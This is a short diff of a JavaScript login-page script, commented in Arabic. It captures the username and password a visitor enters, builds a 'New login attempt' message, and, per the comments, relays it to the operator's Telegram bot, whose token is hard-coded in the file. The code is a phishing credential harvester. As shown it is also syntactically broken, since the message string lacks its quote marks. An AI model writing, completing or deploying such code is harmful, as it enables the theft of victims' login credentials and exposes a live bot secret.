@@ -6,7 +6,7 @@ document.getElementById('loginButton').addEventListener('click', function (e) {
   const password = document.getElementById('password').value;
 
   // إنشاء الرسالة لإرسالها عبر البوت
-  const message = New login attempt:\nUsername: ${username}\nPassword: ${password};
+  message = New login attempt:\nUsername: ${username}\nPassword: ${password};
 
   // رابط API البوت الخاص بك مع chat_id الخاص بك
   const botToken = '7404046910:AAEXGNnbZoh2NiXZLDnrOoaucDiqaGTYfCc';
